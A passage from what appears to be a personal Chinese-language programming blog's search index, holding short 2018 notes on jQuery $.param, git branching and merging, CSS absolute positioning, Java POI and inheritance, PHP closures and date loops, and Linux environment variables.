$.param傳參數小筆記","uri":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/"},{"categories":["jQuery"],"content":"$(“form”).serializeArray 產生一個 JavaScript 陣列 [ { \"name\": \"fieldName\", \"value\": \"value\" }, { \"name\": \"name\", \"value\": \"man\" }, { \"name\": \"sex\", \"value\": \"male\" }, { \"name\": \"class[]\", \"value\": \"math\" }, { \"name\": \"class[]\", \"value\": \"chinese\" } ] 一直覺得這個 method 有什麼軟用，不過我來一直重覆看文件 官網有提到 If the object passed is in an Array, it must be an array of objects in the format returned by .serializeArray() [ { name: “first”, value: “Rick” }, { name: “last”, value: “Astley” }, { name: “job”, value: “Rock Star” } ] 原來這玩意可以用在這裡($.param) ","date":"2018-08-17","objectID":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/:2:0","tags":["jQuery","param","form"],"title":"jQuery $.param傳參數小筆記","uri":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/"},{"categories":["jQuery"],"content":"$.param 竟然$().serialize()可以做到我們想要做的事情 前面有提到$.param()就是實作出$().serialize() 但我對他第二個參數，比較有興趣 在開方者工作測試 $.param 除了可以吃$.serializeArray傳回的陣列以外 他還能實接對物件做解析 比較需要注意的事情是 var myObject = { a: { one: 1, two: 2, three: 3 }, b: [1, 2, 3] }; var recursiveEncoded = $.param(myObject); var recursiveDecoded = decodeURIComponent($.param(myObject)); alert(recursiveEncoded); // a%5Bone%5D=1\u0026a%5Btwo%5D=2\u0026a%5Bthree%5D=3\u0026b%5B%5D=1\u0026b%5B%5D=2\u0026b%5B%5D=3 alert(recursiveDecoded); // a[one]=1\u0026a[two]=2\u0026a[three]=3\u0026b[]=1\u0026b[]=2\u0026b[]=3 php 程式需要做 form 表單送出的時候，需要用a[one]=1\u0026a[two]=2\u0026a[three]=3\u0026b[]=1\u0026b[]=2\u0026b[]=3 但這時候 myObject 屬性塞陣列/物件，jQuery 預設會轉 $.param 接收物件的時候，第二個參數就有差了 遇設是 false，所以寫 php 都不用調整這個參數 但是 jsp 的就需要了 默認的話，traditional 為 false，即 jquery 會深度序列化參數對象，以適應如 PHP 和 Ruby on Rails 框架 jQuery ajax 的 traditional 參數的作用 - i33 的個人空間 - 開源中國 $.param(myObject, false) 顯示結果為 a[one]=1\u0026a[two]=2\u0026a[three]=3\u0026b[]=1\u0026b[]=2\u0026b[]=3 $.param(myObject, true) 顯示結果為a=[object+Object]\u0026b=1\u0026b=2\u0026b=3 所以不管怎麼用，checkbox name 還是一定要加[] ","date":"2018-08-17","objectID":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/:3:0","tags":["jQuery","param","form"],"title":"jQuery $.param傳參數小筆記","uri":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/"},{"categories":["jQuery"],"content":"寫 PHP checkbox 記得一件事 我覺得我還是一定會忘記 XDD 再寫一次 寫 checkbox 相同 name 的時候，記得在 PHP 變數加個[] ex: \u003cinput name=\"xxxx[]\" type=\"checkbox\" /\u003e \u003cinput name=\"xxxx[]\" type=\"checkbox\" /\u003e \u003cinput name=\"xxxx[]\" type=\"checkbox\" /\u003e \u003cinput name=\"xxxx[]\" type=\"checkbox\" /\u003e ","date":"2018-08-17","objectID":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/:4:0","tags":["jQuery","param","form"],"title":"jQuery $.param傳參數小筆記","uri":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/"},{"categories":["jQuery"],"content":"jQuery.ajaxSettings.traditional = true; 預設做 ajax 動作實候，呼叫$.param(xxx,true)會自動帶後面的 true 但自己寫$.param，還是需要手動加(xxx,true) 參考來源： jQuery.param() | jQuery API Documentation jquery serialize()、serializearray()已经$.param 方法 - youxin - 博客园 ","date":"2018-08-17","objectID":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/:5:0","tags":["jQuery","param","form"],"title":"jQuery $.param傳參數小筆記","uri":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/"},{"categories":["Git"],"content":"最近接到一個程式修改，原本我以為沒有git 但是作完的時候，副理跟我說需要盒併他的git 網路找到相關資料，就結論而且不時適合做merge 兩個git該如何合併呢? 处理合并冲突 git - 为什么要先commit，然后pull，最后再push？而不是commit然后直接push？ - SegmentFault 思否 Is it possible to cherry-pick a commit from another git repository? - Stack Overflow add remote xxx url git fetch xxx git checkout -b ooo xxx/master 可以做merge動作(但是可能會有很多衝突) 事後想想，應該我直接git clone 對方git 做合併應該比較快 就依對方做commit就好 ","date":"2018-08-16","objectID":"/blog/posts/%E5%85%A9%E5%80%8Bgit-repo%E5%90%88%E4%BD%B5%E5%9C%A8%E4%B8%80%E8%B5%B7/:0:0","tags":["git","merge"],"title":"兩個git repo合併在一起","uri":"/blog/posts/%E5%85%A9%E5%80%8Bgit-repo%E5%90%88%E4%BD%B5%E5%9C%A8%E4%B8%80%E8%B5%B7/"},{"categories":["CSS"],"content":"最近發現HTML tag dialog屬性可以用了 當下好奇怎麼可以使用?? 當下好奇瀏覽器怎麼排排板的 發現原來是用absolute日上margin可以這樣置中 PS: 目前Firefox 53裡的about:config需要設定dom.dialog_element.enabled為true 才能完整用js操作 HTMLDialogElement.returnValue - Web APIs | MDN https://segmentfault.com/a/1190000003820437#articleHeader9 html - Why does “position: absolute; left: 0; right: 0; width: XYpx; margin: 0 auto” actually center? - Stack Overflow css - div的position:absolute；left:0;right:0;margin:0 auto;为什么可以居中？ - SegmentFault 思否 CSS规范 \u003e 10 视觉格式化模型详述 Visual Formatting Model Details - HaoyCn’s Blog - SegmentFault 思否 postition:absolute; left:0px; right:0px; 要加margin auto; 但為什麼這樣就能置中呢? 網路找了一下，其實滿不好找的(但還是有的)… CSS 垂直置中的七個方法 - OXXO.STUDIO 不過…為什麼這樣能置中?我就Google找了一下中文文件(英文太菜了\u003e.\u003c) 這篇有講到css - 絕對定位div寬度如何自適應內容。 - SegmentFault 思否 ","date":"2018-08-15","objectID":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/:0:0","tags":["css","position","absolute"],"title":"CSS position:absolute 垂直置中妙用","uri":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/"},{"categories":["CSS"],"content":"containing block 怎么确定一个元素的containing block，由position属性确定： static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分） absolute: 向上找最近的定位为absolute/relative的元素 fixed: 它的containing block一律为根元素(html/body)，根元素也是initial containing block CSS 中 block-level boxes、containing block、block formatting context 三者之间的区别和联系是怎样的？ - 知乎 難怪之前會覺得position設定width height百分比怪怪的，看到這個終於解開我心中疑惑 ","date":"2018-08-15","objectID":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/:0:1","tags":["css","position","absolute"],"title":"CSS position:absolute 垂直置中妙用","uri":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/"},{"categories":["CSS"],"content":"inline 裡面element使用position位置 Containing Block(包含块模型) - 简书 CSS direction属性简介与实际应用 « 张鑫旭-鑫空间-鑫生活 CSS规范 \u003e 10 视觉格式化模型详述 Visual Formatting Model Details - HaoyCn’s Blog - SegmentFault 思否 那麼該收縮適應寬度即：min(max(首選最小寬度,可用寬度),首選寬度)。 3個寬度說明： 首選寬度：按照不自動斷行的方式排版，取得的內容寬度（可以理解為不受容器限制自動排列的寬度就是你想要的效果） 首選最小寬度：calculate the preferred minimum width, e.g.,by trying all possible line breaks（我理解就是在1的情況下你把容器不斷縮小到不能換行，一般是單個文字的寬度） 可用寬度：就是把right設置為0，計算出的width ","date":"2018-08-15","objectID":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/:1:0","tags":["css","position","absolute"],"title":"CSS position:absolute 垂直置中妙用","uri":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/"},{"categories":["CSS"],"content":"更多詳細要了解的 (未深入了解的，吸收不能\u003e.\u003c，之後踩雷再研究) 深入理解CSS绝对定位absolute - 小火柴的蓝色理想 - 博客园 裡面有一些觀念， 1.position:absolute遇到float:right，浮動(float)就會失效。但是relative就沒有這個問題 2.position:absolute，parent並不會算到子原素absolute的寬度、高度 還有很多 CSS绝对定位的应用 - 小火柴的蓝色理想 - 博客园 左半邊翻圖範例很有意思 CSS进阶——绝对定位元素的宽高是如何定义的 - 掘金 根元素（在HTML文档中即元素）所在的包含块即是初始包含块，对于浏览器来说：初始包含块的大小即是视口的大 這個雷，我還真的不知道… 想說怎麼不是在最底端呢…. 由布局学习CSS——从两列布局来看position：absolute的用法 - shawnXiao - 博客园 position:absolute ","date":"2018-08-15","objectID":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/:2:0","tags":["css","position","absolute"],"title":"CSS position:absolute 垂直置中妙用","uri":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/"},{"categories":["CSS"],"content":"隨意寫的範例loading https://jsbin.com/diyavuyihi/1/edit?html,css,output ","date":"2018-08-15","objectID":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/:3:0","tags":["css","position","absolute"],"title":"CSS position:absolute 垂直置中妙用","uri":"/blog/posts/CSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8/"},{"categories":["Java"],"content":"最近做報表用到POI 有踩到一個雷，由於真的不是很熟POI 所以趕快來記我踩的雷 poi操作excel文件 - CSDN博客 HSSF、XSSF和SXSSF区别以及Excel导出优化 - PC君 - 博客园 可能踩雷，未知java.lang.IllegalArgumentException: Sheet index (-1) is out of range (0..2)問題 經查詢是這段問題 workbook.setSheetName( sheetIndex , userType == 0 ? label : label + xxxxxx); //下面是原寫法 //sheet = workbook.getSheet(\"XXXXX\"); //下面是修改寫法 sheet = workbook.getSheetAt(sheetIndex); System.out.println(\"sheetIndex:\" + workbook.getSheetIndex(sheet)); String sheetName = userType == 0 ? label : label + xxxxxx; // 按不同方案別命名Sheet workbook.setSheetName(sheetIndex, sheetName); System.out.println(\"sheetName:\" + sheetName); // 按不同方案別命名Sheet workbook.setSheetName( sheetIndex , userType == 0 ? label : label + xxxxxx); createRow 會覆蓋當下row // 由於資料過少的話，temple Excel欄位header會印出來，所以目前先用小於五筆資料，新增5列資料去覆蓋 if (arrayList.size() \u003c= 5) { for (int i = 0; i \u003c arrayList.size(); i++) { int idxrow = i + 1 + arrayList.size(); XSSFRow row1 = sheet.createRow(idxrow); // 固定內容部分 XSSFCell cell_1 = row1.createCell(0); cell_1.setCellType(XSSFCell.CELL_TYPE_STRING); cell_1.setCellValue(\"\"); XSSFCell cell_2 = row1.createCell(1); cell_2.setCellType(XSSFCell.CELL_TYPE_STRING); cell_2.setCellValue(\"\"); XSSFCell cell_3 = row1.createCell(2); cell_3.setCellType(XSSFCell.CELL_TYPE_STRING); cell_3.setCellValue(\"\"); // 變動欄位 XSSFCell cell_4 = row1.createCell(3); cell_4.setCellType(XSSFCell.CELL_TYPE_STRING); cell_4.setCellValue(\"\"); XSSFCell cell_5 = row1.createCell(4); cell_5.setCellType(XSSFCell.CELL_TYPE_STRING); cell_5.setCellValue(\"\"); XSSFCell cell_6 = row1.createCell(5); cell_6.setCellType(XSSFCell.CELL_TYPE_STRING); cell_6.setCellValue(\"\"); } POI ，Java 操作 Excel 实现行的插入（insert row） - CSDN博客 POI实现插入一行操作，就像office excel插入一行的操作 - cai555 - ITeye博客 NPOI 插入行[转] - kingang - 博客园 Java POI(第一讲):POI中HSSF用法大全-进击的程序猿-51CTO博客 好想寫WEB orz……. ","date":"2018-08-15","objectID":"/blog/posts/JAVA-poi%E6%93%8D%E4%BD%9Cexcel%E6%96%87%E4%BB%B6/:0:0","tags":["java","poi","excel"],"title":"JAVA poi操作excel文件","uri":"/blog/posts/JAVA-poi%E6%93%8D%E4%BD%9Cexcel%E6%96%87%E4%BB%B6/"},{"categories":["寫程式一些事"],"content":"這篇先記錄最近改報表所踩到雷 一直以為我覺得 class member 也可以做 java Overwrite 但 overwrite 好像是指 method 在做繼承方發一想不到事情 public class A{ int usertype = 0; public void ok(){ System.out.println(usertype); } public static void main(String args[]) { C c = new C(); c.ok(); } } class B extends A{ // int usertype = 2; B(){ usertype = 2; } } class C extends B{ // int usertype = 3; C(){ usertype = 3; } } 結果印出應該是 3 但是把 usertype=2 跟 usertype=3 前面注解拿掉 印出來的東西會是0 這個雷… 做後原本想做 js 做做看 JS class 不能用 class member… 發現 typescript 也不行 可能真的在 class member 轉 function 行不通 又好奇試試 PHP 結果發現跟 JAVA 完全不一樣的結果 PHP \u003c?php class A{ public $a = 1; public function ok(){ echo $this-\u003ea; } } class B extends A{ public $a =2; } class C extends B{ public function __construct() { $a =3; } } $o = new C(); $o-\u003eok(); //print 3 PHP class 比較像 JAVA，但結果不一樣…，我感到意外 不過…抽象類別 裡面方法不能用抽象 function 詳細抽象類別（Abstract Class） · PHP 學習筆記 python,golang 我就不試了 orz D2:［Java］類別的繼承（基本範例解說） - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2018-08-14","objectID":"/blog/posts/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/:0:0","tags":["java","php","JavaScript","class"],"title":"java method 類別成員(class member) 繼承踩雷","uri":"/blog/posts/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/"},{"categories":["寫程式一些事"],"content":"2019-02-21 今天剛好做 PHP 有關 class，突然想到 Java 之前遇到的問題還沒有理解為什麼 感覺this是參照原本 method 那一層的(這一點跟 PHP self 很像，$this 是實例物件) 所以一直抓到父層 A，沒有解決抓到在C 這解決方法除了寫在建構式，寫在子層static也能解決 我原先的錯誤想法 在想是因為 extends，所以父層 function 複製到子層那邊去 其實用參照(reference)的方法想就很好懂了 class Son extends Dad { static { me = 'son'; } } inheritance - Is there a way to override class variables in Java? - Stack Overflow 難怪最近看到有一個程式 宣告 class 裡面的變數 都不會直接給值，都寫在 constructor 也許子層不需要再重新宣告父層有的變數 複寫都在constructor可能會比較好 這可能是最好的良好習慣 參考來源: 關於 this this 與 final 通过 static 关键词来实现 late static binding（静态调用绑定）-pilishen.com,做全球最好的实战教程 繼承 [java 程式筆記]建構子 Constructor - 觀念與例題研究 @ 貓羽的文字日誌 :: 痞客邦 :: inheritance - Accessing inherited class variables in java - Stack Overflow JWorld@TW Java 論壇 - 建構子?? inheritance - Is there a way to override class variables in Java? - Stack Overflow override - Overriding member variables in Java - Stack Overflow JAVA [PHP 觀念]self 和$this 的差異 @ 麥克的學習紀錄 :: 痞客邦 :: ","date":"2018-08-14","objectID":"/blog/posts/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/:0:1","tags":["java","php","JavaScript","class"],"title":"java method 類別成員(class member) 繼承踩雷","uri":"/blog/posts/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/"},{"categories":["PHP"],"content":"一直都不是看很懂，PHP閉包語法要怎麼看 之前有學JavaScript閉包，但不是很明白PHP閉包跟它插在哪裡 不過最近有爬到這篇 //输出: This is a closure use string value lazy bind, msg is: Hello, everybody.\u003cbr /\u003e/n //换一种引用方式, 我们使用引用的方式来use //可以发现这次输出是闭包定义后的值... //这个其实不难理解, 我们以引用方式use, 那闭包use的是$msg这个变量的地址 //当后面对$msg这个地址上的值进行了改变之后, 闭包内再输出这个地址的值时, 自然改变了. $msg = \"Hello, everyone\"; $callback = function () use (\u0026$msg) { print \"This is a closure use string value lazy bind, msg is: $msg. \u003cbr /\u003e/n\"; }; $msg = \"Hello, everybody\"; callback($callback); 這個案例有點跟JavaScript閉包高達相似度 也能寫出跟JS閉包一樣的計時器 參考來源： php 5.3新增的闭包语法介绍function() use() {} - CSDN博客 ","date":"2018-08-12","objectID":"/blog/posts/PHP-%E9%96%89%E5%8C%85-function-use-xxx/:0:0","tags":["php","閉包"],"title":"PHP 閉包 function() use (xxx){}","uri":"/blog/posts/PHP-%E9%96%89%E5%8C%85-function-use-xxx/"},{"categories":["Linux"],"content":"最近同事在測試環境玩GO語言 他好像在linux沒法執行編譯程式 golang 跨平台編譯——go 在windows上編譯Linux平台的程序（Cross Compilation from Windows to Linux/Ubuntu） - 牛頓的小腦 - 博客園 他是在window編譯完後在linux上面不能跑 後來我發現他沒有執行chmod a+x hello 所以不能執行 最後他試著在linux上面放go語言 設定環境變數有點況狀 當然要趁著這個機會好好了解XD 有設定export PATH=$PATH:/xxx/go/bin 但是登出後 就會被清除 來自鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH 要永久存放參數，可以放在~/bash_profile 假如要所有人登入能跑的話可以放在/etc/profile 詳細可參考鳥哥裡面的圖片shell執行順序 source 之前寫超級終端機文章有寫到source 超級終端機 zplug | 程式狂想筆記 由於 /etc/profile 與 ~/.bash_profile 都是在取得 login shell 的時候才會讀取的設定檔，所以， 如果你將自己的偏好設定寫入上述的檔案後，通常都是得登出再登入後，該設定才會生效。那麼，能不能直接讀取設定檔而不登出登入呢？ 可以的！那就得要利用 source 這個指令了！ 利用 source 或小數點 (.) 都可以將設定檔的內容讀進來目前的 shell 環境中！ 舉例來說，我修改了 ~/.bashrc ，那麼不需要登出，立即以 source ~/.bashrc 就可以將剛剛最新設定的內容讀進來目前的環境中！很不錯吧！還有，包括 ~/bash_profile 以及 /etc/profile 的設定中， 很多時候也都是利用到這個 source (或小數點) 的功能喔！ 鳥哥的 Linux 私房菜 – source ：讀入環境設定檔的指令 env 看環境變數用 ","date":"2018-08-09","objectID":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/:0:0","tags":["linux","source","env","export"],"title":"linux 設定環境變數","uri":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"},{"categories":["Linux"],"content":"cmd1 \u0026\u0026 cmd2與 cmd1 ||cmd2 之前有寫過連續打指令\u0026\u0026 與;差別 | 程式狂想筆記 ","date":"2018-08-09","objectID":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/:1:0","tags":["linux","source","env","export"],"title":"linux 設定環境變數","uri":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"},{"categories":["Linux"],"content":"cmd1 \u0026\u0026 cmd2 若 cmd1 執行完畢且正確執行($?=0)，則開始執行 cmd2。 若 cmd1 執行完畢且為錯誤 ($?≠0)，則 cmd2 不執行。 ","date":"2018-08-09","objectID":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/:1:1","tags":["linux","source","env","export"],"title":"linux 設定環境變數","uri":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"},{"categories":["Linux"],"content":"cmd1 || cmd2 若 cmd1 執行完畢且正確執行($?=0)，則 cmd2 不執行。 若 cmd1 執行完畢且為錯誤 ($?≠0)，則開始執行 cmd2。 來自鳥哥的 Linux 私房菜 – $? (指令回傳值) 與 \u0026\u0026 或 || $?是指令回傳錯誤碼 \u0026\u0026 cmd1執行錯誤就不會執行cmd2 || cmd1執行錯誤就會執行cmd2，相反cmd1執行正確cmd2就不會執行 這個好特別!!! ","date":"2018-08-09","objectID":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/:1:2","tags":["linux","source","env","export"],"title":"linux 設定環境變數","uri":"/blog/posts/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"},{"categories":["Git"],"content":"最近公司master merge一直出問題 有一直想到feature一直建立分支，需求爆多那不分支不是之後會越積越多 一直找不到答案 最後在30 天精通 Git 版本控管 (17)：關於合併的基本觀念與使用方式 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天找到答案 刪除不必要的分支 假設我們 feature 分支還會持續開發新功能，所以可以暫時將它留著，讓後續還能繼續切換到 feature 分支繼續開發。 如果你確定用不到的話，可以用 git branch -d feature 刪除該分支。 在 Git 裡，只要沒有執行過「合併」的分支，都不能用上述指令進行刪除，必須改用 git branch -D feature 才能刪除該分支。 (在有merge過的分支) 刪除分支commit會留著 想建立回來刪除的branch 可以用checkout到之前的commit (在沒有merge過的分支) 刪除分支 git log --oneline --all 沒有看到commit 囧 我原本實驗以為是真的把commit刪掉 但是看【狀況題】不小心把還沒合併的分支砍掉了，救得回來嗎？ 為你自己學 Git 說明commit 不會馬上被刪掉，但有機會之後被git垃圾清除 【常見問題】合併過的分支要留著嗎？ 為你自己學 Git 我覺得是我需求完成結案就刪吧 又有需求再開新branch 使用git branch 建出來的branch會在你現在的commit 真的是很神奇東西 話說git我原本以為他是zip觀念 刪除整個commit都會不見 現在感覺他跟指標(point)很像(事後查到【狀況題】不小心把還沒合併的分支砍掉了，救得回來嗎？ 為你自己學 Git裡面有寫到) 等等，他好像跟tag屬性重疊XD 關於版本控管系統的分支(branch)與標籤(tag)的區別 | Kenmingの鮮思維這邊有簡單介紹 用法不太一樣 但等等…怎麼知道有哪些branch已經合併 不可能用gitk --all肉眼看圖 爬文有找到Git - 分支的管理 查詢合併分支git branch --merged 查詢沒有合併分支git branch --no-merged 建立 / 刪除分支 · Git delete git branch local and remote (刪除本地跟遠端 git branch) | louie_lu’s blog 怎么用git clone 远程的所有分支 - 简书 ","date":"2018-08-09","objectID":"/blog/posts/git-%E5%88%AA%E9%99%A4%E5%88%86%E6%94%AFcommit%E6%9C%83%E7%95%99%E8%91%97/:0:0","tags":["git"],"title":"git 刪除分支commit會留著?!","uri":"/blog/posts/git-%E5%88%AA%E9%99%A4%E5%88%86%E6%94%AFcommit%E6%9C%83%E7%95%99%E8%91%97/"},{"categories":["Git"],"content":"最近之前學會fetch 跟merge 線上git分支 但最近開發偶爾會遇到衝突 而且還是幫我推git的人到正式環境裡面同樣我改的commit衝突(他用cherry-picker) 突然覺得我有什麼觀念不對 PS:公司只有用master一條 就請叫我同事，他怎麼避免這個問題 他說他會開分支，但自己分支完不會合併到自己master上面 然後master不要做任何commit，他只做更新動作 分支都從master出來，改程式都需要在自己建立的分支 改完一樣給推git的人commit id 他更新完，就可以更新(pull) remote master分支 這樣不會衝突 PS: cherry-pick出來的commit會不一樣 雖然這不是gitflow，但還是先了解git 知道使用方式才是正確的 等下次有機會使用新的專案 可以自己用用看 Git怎麼這麼難用？Git Flow + 好習慣 = 不再苦惱 – Kuma老師的軟體工程教室 – Medium 最後還煩腦commit message要怎麼寫才比較不會亂 很迷茫的去看vscode裡面的git，裡面分支好多又好亂(可能是我不會看) Google有爬到好文如何寫一個 Git Commit Message | louie_lu’s blog 裡面說可以去看linux和git linux的git好大 所以我只看git git分支不多，會看到很多一點做merge 對我而言是整齊的亂XD GIT真的可以用很活，但是用不好感覺很容易爆炸 ","date":"2018-08-09","objectID":"/blog/posts/git-merge-master-%E5%B8%B8%E5%B8%B8%E9%81%87%E5%88%B0%E8%A1%9D%E7%AA%81%E7%9A%84%E9%9B%B7/:0:0","tags":["git"],"title":"git merge master 常常遇到衝突的雷","uri":"/blog/posts/git-merge-master-%E5%B8%B8%E5%B8%B8%E9%81%87%E5%88%B0%E8%A1%9D%E7%AA%81%E7%9A%84%E9%9B%B7/"},{"categories":["Git"],"content":"先留個常忘記GIT觀念 以免忘記XD 常常最後修改檔案，做git add。但再次異動也要再做git add動作 剛建立branch，兩個branch都在同一條上面(應該說是同一個點) git add 要怎麼取消 git reset HEAD OR git checkout – filename git branch要怎麼修改名稱 git branch -m oldName newName 新分之要先設好預設的remote git –set-upstream-to origin/newName git修改分支名称 - 简书 分支是point指標概念 (可以看上面第二點) 分支刪除掉commit不會不見 刪除沒有合並的分支，gitkcommit是看不到的，但他過很久會進入git垃圾回收 刪除合並的分支，gitkcommit還是回流下來 master,develop盡量用merge，一個需求開一個feature，然後完成可以與develop做合併(可參考gitflow) git remote有點像網路上的git分支，fetch完可以在與本地做merge動作 不同git來源也能加入別的git repo(git remote add xxx http://xxxx) 不支援大小寫 Git 修改檔名大小寫 $ git config core.ignorecase false $ git mv -f abc.php Abc.php XYZ的筆記本: Git 修改檔名大小寫 ","date":"2018-08-09","objectID":"/blog/posts/%E5%B8%B8%E6%90%9E%E9%8C%AFGIT%E8%A7%80%E5%BF%B5-for-me/:0:0","tags":["git"],"title":"常搞錯GIT觀念(for me)","uri":"/blog/posts/%E5%B8%B8%E6%90%9E%E9%8C%AFGIT%E8%A7%80%E5%BF%B5-for-me/"},{"categories":["PHP"],"content":"最近剛好做要依日期做for迴圈 就試著寫寫看 \u003c?php for ($now_date = $first_day; $now_date \u003c= $last_day; $now_date = date('Y-m-d', strtotime(\"$now_date +1 DAY\"))){ ... } 寫完覺得寫出還滿實用的東西 Google爬一下有什麼解法 瞬間覺得我的code是垃圾orz ","date":"2018-08-05","objectID":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/:0:0","tags":["php","date"],"title":"php for迴圈跑date+1天運算記錄","uri":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/"},{"categories":["PHP"],"content":"Stack Overflow寫法 \u003c?php $begin = new DateTime('2010-05-01'); $end = new DateTime('2010-05-10'); $interval = DateInterval::createFromDateString('1 day'); $period = new DatePeriod($begin, $interval, $end); foreach ($period as $dt) { echo $dt-\u003eformat(\"l Y-m-d H:i:s\\n\"); } I have 2 dates in PHP, how can I run a foreach loop to go through all of those days? - Stack Overflow ","date":"2018-08-05","objectID":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/:1:0","tags":["php","date"],"title":"php for迴圈跑date+1天運算記錄","uri":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/"},{"categories":["PHP"],"content":"官網範例 \u003c?php $begin = new DateTime( '2012-08-01' ); $end = new DateTime( '2012-08-31' ); $end = $end-\u003emodify( '+1 day' ); $interval = new DateInterval('P1D'); $daterange = new DatePeriod($begin, $interval ,$end); foreach($daterange as $date){ echo $date-\u003eformat(\"Ymd\") . \"\u003cbr\u003e\"; } ?\u003e 感覺實務上還是竟量用DateTime()物件 modify竟然也有做時間加總運算 DatePeriod可以做到日期跑一遍 真的很方便 ","date":"2018-08-05","objectID":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/:2:0","tags":["php","date"],"title":"php for迴圈跑date+1天運算記錄","uri":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/"},{"categories":["PHP"],"content":"DateInterval PHP: DateInterval - Manual DateInterval可以做時間之間運算 使用DateTime裡面的add/sub 最神的還能用在diff 算兩個之間差 詳細可以再看看PHP: DateTime - Manual裡面 裡面爬到DateInterval沒有負的時間 裡面神人有寫 \u003c?php class DateRange extends ArrayIterator { protected $oDate = null; protected $oStartDate = null; protected $oEndDate = null; protected $oInterval = null; public function __construct( DateTime $oStartDate, DateTime $oEndDate, DateInterval $oInterval = null ) { $this-\u003eoStartDate = $oStartDate; $this-\u003eoDate = clone $oStartDate; $this-\u003eoEndDate = $oEndDate; $this-\u003eoInterval = $oInterval; } public function next() { $this-\u003eoDate-\u003eadd($this-\u003eoInterval); return $this-\u003eoDate; } public function current() { return $this-\u003eoDate; } public function valid() { if ($this-\u003eoStartDate \u003e $this-\u003eoEndDate) { return $this-\u003eoDate \u003e= $this-\u003eoEndDate; } return $this-\u003eoDate \u003c= $this-\u003eoEndDate; } } $oRange = new DateRange(new DateTime(\"2013-10-01\"), new DateTime(\"2013-01-01\"), DateInterval::createFromDateString(\"-1 month\") ); foreach ($oRange as $oDate) { echo $oDate-\u003eformat(\"Y-m-d\") . 